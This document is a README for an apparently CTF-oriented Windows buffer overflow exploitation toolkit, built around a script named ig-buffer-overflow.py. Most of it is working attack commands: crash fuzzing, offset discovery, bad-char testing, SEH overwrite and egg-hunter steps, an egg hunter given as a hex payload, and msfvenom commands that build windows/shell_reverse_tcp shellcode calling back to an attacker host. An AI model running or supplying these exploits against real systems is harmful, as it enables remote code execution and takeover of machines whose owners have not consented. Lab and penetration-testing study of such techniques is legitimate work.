# Buffer Overflow

Scripts for exploiting buffer overflow.

* create-reverve-jmp.py - Generates a reverse jmp instruction (hex string)
* ig-buffer-overflow.py - Help functions for exploting buffer overflow vulnerabilities in a Windows remote binary.
* socket-reuse-ws2_32.recv.py - Example code for exploiting a socket reuse with winsocket dll (WS2_32.recv)

# ig-buffer-overflow.py
* Help functions for exploting buffer overflow vulnerabilities in a Windows remote binary. 
* Tested with: Vanilla Buffer Overflow, Structured Exception Handling Overwrite (SEH Overwrite), Egg Hunting.

## Usage

test - Sends simple string (AAAAA) with buffer size and buffer head for memory test
```
./ig-buffer-overflow.py -m test --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/'
```

cyclic - Sends cyclic pattern to help identify memory positions
```
./ig-buffer-overflow.py -m cyclic --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/'
```

checkoffset - Auxiliary mode for offset detection on pattern
```
./ig-buffer-overflow.py -m checkoffset --value=31704331 --length=5000
```

write - Writes hex value to buffer offset
```
./ig-buffer-overflow.py -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809
```

write - Writes hex value to buffer offset and additional content before and/or after the offset content
```
./ig-buffer-overflow.py -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809 --before=90909090 --after=9090
```

write - Writes badchars (before or after offset content) for badchar verification
```
./ig-buffer-overflow.py -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809 --after=badchar --exclude=000a
./ig-buffer-overflow.py -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809 --before=badchar --exclude=000a
```

write - Sends malicious shell code (hex string file) via buffer overflow
```
./ig-buffer-overflow.py -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809 --before=shellcode --shellcode=opencalc --nops=10
./ig-buffer-overflow.py -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809 --after=shellcode --shellcode=opencalc
```

## Parameters:
* --help|-h	: Show script usage.
* --norec|-n	: Don't wait for receive message after connect.
* --mode|-m	: Select script mode (test|cyclic|write|checkoffset).
* --rhost		: Remote host IP.
* --rport		: Remote host port.
* --buffsize	: Amount of variable bytes to send.
* --buffhead	: Static buffer string set at the beginning of the buffer.
  * Is usually the crash string. Size is considered in buffSize calc.
* --interact	: Interact with the application before sending the payload. For each message in string (separated with ';;'), sends and receives response from app.
  * Example: --interact='login;;user' --> Sends 'login', gets response, sends 'user', gets response, and finally sends the generated payload
* --offset	: Place in buffer where content can be added.
* --hexcontent	: Hex string to add at the offset position.
  * Can be considered as big endian (default) or little endian (will be reversed).
  * Use 'g' or 'l' to delimit the order. Examples:
    * 'g01020304l05060708' --> will send '0102030408070605'
    * '01020304' --> will send '01020304'
* --before|after	: Writes additional content (hex string) before and/or after the offset content.
  * If content is 'badchar', content will be a generated badchar list. Used for bad char testing.
  * If content is 'shellcode', --shellcode parameter will be expected.
  * Other content will be considered as big endian (default) or little endian (will be reversed). Same as --hexcontent.
* --exclude	: List of chars (formatted as hex string) to be excluded from badchar list.
* --shellcode	: Hex shell code file generated using msfvenom. 
  * Example: msfvenom -p windows/exec cmd=calc.exe -b '\x00' -f hex EXITFUNC=thread -o opencalc
* --nopsb|nopsa	: Amount of nops to add before and/or after the additional write content (be if badchars, shellcode or simple hexstring). Default is 0.
* --value		: Offset value.
* --length	: Cyclic pattern length.


## Vanilla Buffer Overflow example

[TryHackMe - Brainstorm - Write-up](https://github.com/isabellecda/writeups/tree/main/TryHackMe/Brainstorm)

## SEH Overwrite example

1. Overwrite SEH chain
```
./ig-buffer-overflow.py -m test --rhost=10.2.31.155 --rport=2050 --buffsize=4085 --buffhead='cmd2 /.../'
```

2. Identify SEH offset
```
./ig-buffer-overflow.py -m cyclic --rhost=10.2.31.155 --rport=2050 --buffsize=4085 --buffhead='cmd2 /.../'
```

3. Small jump (90EB0890) to tail content
```
./ig-buffer-overflow.py -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4085 --buffhead='cmd2 /.../' --offset=3290 --hexcontent=g90EB0890l62501301
```

4. Long jump (E9DBFCFFFF) to head content
```
./ig-buffer-overflow.py -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4085 --buffhead='cmd2 /.../' --offset=3290 --hexcontent=g90EB0890l62501301 --after=gE9DBFCFFFF --nopsa=4
```

5. Bad char testing
```
./ig-buffer-overflow.py -m write --rhost=10.2.31.155 --rport=5048 --buffsize=4096 --buffhead='cmd2 /.../' --offset=3391 --hexcontent=g90EB0890l62501301 --after=gE9DBFCFFFF --nopsa=4 --before=badchar --nopsb=4 --exclude=00 -v
```

6. Exploit
```
msfvenom -p windows/shell_reverse_tcp -b "\x00" LHOST=10.2.31.1 LPORT=1313 -f hex EXITFUNC=thread -o reverse

./ig-buffer-overflow.py -m write --rhost=10.2.31.155 --rport=2050 --buffsize=4085 --buffhead='cmd2 /.../' --offset=3290 --hexcontent=g90EB0890l62501301 --after=gE9DBFCFFFF --nopsa=4 --before=shellcode --shellcode=reverse --nopsb=20 -v
```

## Egg Hunting example

1. Overwrite EIP
```
./ig-buffer-overflow.py -m test --rhost=10.2.31.155 --rport=2048 --buffsize=1000 --buffhead='cmd1 /.:/'
```

2. Identify EIP offset
```
./ig-buffer-overflow.py -m cyclic --rhost=10.2.31.155 --rport=2048 --buffsize=1000 --buffhead='cmd1 /.:/'
```

3. Identify command to write to memory
```
./ig-buffer-overflow.py -m test --rhost=10.2.31.146 --rport=2050 --buffsize=1000 --buffhead='cmd2 OVNI'
```

4. Bad char testing
```
./ig-buffer-overflow.py -m write --rhost=10.2.31.146 --rport=2050 --buffsize=2000 --buffhead='cmd2 OVNI' --offset=1 --hexcontent=90 --after=badchar --exclude=00 --nopsa=2 -v
```

5. Write exploit with egg
```
msfvenom -p windows/shell_reverse_tcp -b "\x00" LHOST=10.2.31.1 LPORT=1313 -f hex EXITFUNC=thread -o reverse

./ig-buffer-overflow.py -m write --rhost=10.2.31.146 --rport=2050 --buffsize=2000 --buffhead='cmd2 OVNIOVNI' --offset=1 --hexcontent=90 --after=shellcode --shellcode=reverse --nopsa=20 -v
```

6. Generate egg hunter and send
```
msf-egghunter -f hex -e OVNI -v egg

./ig-buffer-overflow.py -m write --rhost=10.2.31.146 --rport=2050 --buffsize=144 --buffhead='cmd1 /.:/' --offset=48 --hexcontent=l6250130A --after=6681caff0f42526a0258cd2e3c055a74efb84f564e4989d7af75eaaf75e7ffe7 --nopsa=2 -v
```
